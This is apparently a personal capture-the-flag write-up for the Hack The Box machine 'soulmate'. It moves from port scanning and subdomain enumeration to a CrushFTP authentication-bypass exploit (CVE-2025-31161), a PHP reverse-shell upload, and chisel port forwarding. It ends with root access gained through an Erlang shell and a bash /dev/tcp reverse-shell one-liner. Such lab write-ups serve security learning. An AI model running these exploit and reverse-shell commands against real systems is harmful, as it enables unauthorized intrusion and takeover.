---
created: 2026-03-13
modified: 2026-03-13
---

![[Pasted_image_20250909143841.png]]

## Recon

## Port Scan

```bash
# Nmap 7.95 scan initiated Tue Sep  9 14:38:15 2025 as: /usr/lib/nmap/nmap -Pn -sCV -p- --min-rate 2500 -T3 -oN soulmate-port-scan 10.129.179.247
Nmap scan report for 10.129.179.247
Host is up (0.53s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soulmate.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Sep  9 14:39:12 2025 -- 1 IP address (1 host up) scanned in 56.57 seconds
```

We have two ports open.

on port 80 we have this this web app

![[Pasted_image_20250909160135.png]]

we also have an upload functionality but it seem well secured.

## Directory, DNS, vhost enumeration

i get only this subdomain

```bash
ffuf -u http://soulmate.htb/ -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "HOST: FUZZ.soulmate.htb" -c -fs 154

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://soulmate.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt
 :: Header           : Host: FUZZ.soulmate.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 154
________________________________________________

ftp                     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 419ms]
:: Progress: [151265/151265] :: Job [1/1] :: 91 req/sec :: Duration: [0:24:35] :: Errors: 0 ::

```

we get a login form with no place for registration

![[Pasted_image_20250909160756.png]]

tried some sqli but that didnt work.. went on to search for CrushFTP vulnerabilities and i got one about authentication bypass.
https://projectdiscovery.io/blog/crushftp-authentication-bypass

I dont know the version of CrushFTP am dealing with. Testing with the given POC in the above aticle turns out the application is vulnerable.

![[Pasted_image_20250909161125.png]]

Tried reading the CrushFTP documentation to know how to add a new user but my exploit kept failing ..

search for an exploit with `searchsploit` we get exactly what we are looking for.

```bash
searchsploit crushftp
--------------------------------------------------- ---------------------------------
 Exploit Title                                     |  Path
--------------------------------------------------- ---------------------------------
CrushFTP 11.3.1 - Authentication Bypass            | multiple/remote/52295.py
CrushFTP 7.2.0 - Multiple Vulnerabilities          | multiple/webapps/36126.txt
CrushFTP < 11.1.0 - Directory Traversal            | multiple/remote/52012.py
--------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

```bash
locate 52295.py              
/usr/share/exploitdb/exploits/multiple/remote/52295.py
```

### Exploiting 

```bash
python3 /usr/share/exploitdb/exploits/multiple/remote/52295.py --target ftp.soulmate.htb --port 80 --check                                       

[36m
  / ____/______  _______/ /_  / ____/ /_____
 / /   / ___/ / / / ___/ __ \/ /_  / __/ __ \
/ /___/ /  / /_/ (__  ) / / / __/ / /_/ /_/ /
\____/_/   \__,_/____/_/ /_/_/    \__/ .___/
                                    /_/
[32mCVE-2025-31161 Exploit 2.0.0[33m | [36m Developer @ibrahimsql
[0m

Scanning 1 targets with 10 threads...
Scanning targets... ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% (1/1) 0:00:00

Scan complete! Found 1 vulnerable targets.

Summary:
Total targets: 1
Vulnerable targets: 1
Exploited targets: 0
```

Creating a user
```bash
python3 /usr/share/exploitdb/exploits/multiple/remote/52295.py --target ftp.soulmate.htb --port 80 --exploit --new-user admin --password P@ssw0rd

[36m
  / ____/______  _______/ /_  / ____/ /_____
 / /   / ___/ / / / ___/ __ \/ /_  / __/ __ \
/ /___/ /  / /_/ (__  ) / / / __/ / /_/ /_/ /
\____/_/   \__,_/____/_/ /_/_/    \__/ .___/
                                    /_/
[32mCVE-2025-31161 Exploit 2.0.0[33m | [36m Developer @ibrahimsql
[0m

Exploiting 1 targets with 10 threads...
[+] Successfully created user admin on ftp.soulmate.htb
Exploiting targets... ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% (1/1) 0:00:00

Exploitation complete! Successfully exploited 1/1 targets.

Exploited Targets:
→ ftp.soulmate.htb

Summary:
Total targets: 1
Vulnerable targets: 0
Exploited targets: 1

```

using the credentials we gain access.

![[Pasted_image_20250909162047.png]]

Exploring the interface i notice that user `ben` can manage web files and also we can change `ben's` password.

![[Pasted_image_20250909195636.png]]

After changing `ben's` password and signing in I notice wqe have the web files, and also we have an option to add more files.. So i decided to add a php rev shell

![[Pasted_image_20250909202229.png]]

![[Pasted_image_20250909203513.png]]

our server gets hit 

![[Pasted_image_20250909203537.png]]

and also we get a connection to our listener 

```bash
rlwrap nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.16.12] from (UNKNOWN) [10.129.179.247] 55222
bash: cannot set terminal process group (1102): Inappropriate ioctl for device
www-data@soulmate:~/soulmate.htb/public$ whoami
whoami
www-data
www-data@soulmate:~/soulmate.htb/public$ 
```


## Lateral Movement 

```bash
www-data@soulmate:/usr/local/lib/erlang_login$ cat start.escript
cat start.escript
#!/usr/bin/env escript
%%! -sname ssh_runner

main(_) ->
    application:start(asn1),
    application:start(crypto),
    application:start(public_key),
    application:start(ssh),

    io:format("Starting SSH daemon with logging...~n"),

    case ssh:daemon(2222, [
        {ip, {127,0,0,1}},
        {system_dir, "/etc/ssh"},

        {user_dir_fun, fun(User) ->
            Dir = filename:join("/home", User),
            io:format("Resolving user_dir for ~p: ~s/.ssh~n", [User, Dir]),
            filename:join(Dir, ".ssh")
        end},

        {connectfun, fun(User, PeerAddr, Method) ->
            io:format("Auth success for user: ~p from ~p via ~p~n",
                      [User, PeerAddr, Method]),
            true
        end},

        {failfun, fun(User, PeerAddr, Reason) ->
            io:format("Auth failed for user: ~p from ~p, reason: ~p~n",
                      [User, PeerAddr, Reason]),
            true
        end},

        {auth_methods, "publickey,password"},

        {user_passwords, [{"ben", "HouseH0ldings998"}]},
        {idle_time, infinity},
        {max_channels, 10},
        {max_sessions, 10},
        {parallel_login, true}
    ]) of
        {ok, _Pid} ->
            io:format("SSH daemon running on port 2222. Press Ctrl+C to exit.~n");
        {error, Reason} ->
            io:format("Failed to start SSH daemon: ~p~n", [Reason])
    end,

    receive
        stop -> ok
    end.

```

The normal 22 port is still working.

```bash
└─$ ssh ben@soulmate.htb 
ben@soulmate.htb's password: 
Last login: Tue Sep 9 23:58:05 2025 from 10.10.16.12
ben@soulmate:~$ ls
user.txt
```

Since port 2222 is only accessible internally in the target system we need to forwad the port to our local machine so that we can ssh using the port.

On my host machine

```bash
./chisel server -p 2221 --reverse
2025/09/10 03:13:05 server: Reverse tunnelling enabled
2025/09/10 03:13:05 server: Fingerprint U1x7vDZtgOuCnni7UT1lR72ZCWtothbb2xu5+Lo/n5U=
2025/09/10 03:13:05 server: Listening on http://0.0.0.0:2221
2025/09/10 03:15:03 server: session#1: tun: proxy#R:2222=>2222: Listening
```

On the target system 

```bash
www-data@soulmate:/tmp$ ./chisel client 10.10.16.12:2221 R:2222:127.0.0.1:2222
<hisel client 10.10.16.12:2221 R:2222:127.0.0.1:2222
2025/09/10 00:14:24 client: Connecting to ws://10.10.16.12:2221
2025/09/10 00:14:28 client: Connected (Latency 178.58619ms)
```

now we try to login usign port 2222

```bash
ssh ben@127.0.0.1 -p 2222
ben@127.0.0.1's password: 
Eshell V15.2.5 (press Ctrl+G to abort, type help(). for help)
(ssh_runner@soulmate)1> os:cmd("whoami").
(ssh_runner@soulmate)1> os:cmd("whoami").

"root\n"
(ssh_runner@soulmate)2> 
```

gettign reverse shell as root

```bash
(ssh_runner@soulmate)3> os:cmd("bash -c 'bash -i >& /dev/tcp/10.10.16.12/4444 0>&1'").
```

```bash
rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.12] from (UNKNOWN) [10.129.144.136] 36738
bash: cannot set terminal process group (35591): Inappropriate ioctl for device
bash: no job control in this shell
root@soulmate:/# cat /root/root.txt
cat /root/root.txt
b3af8ff21d2e82effafc9a680d538eb9
```
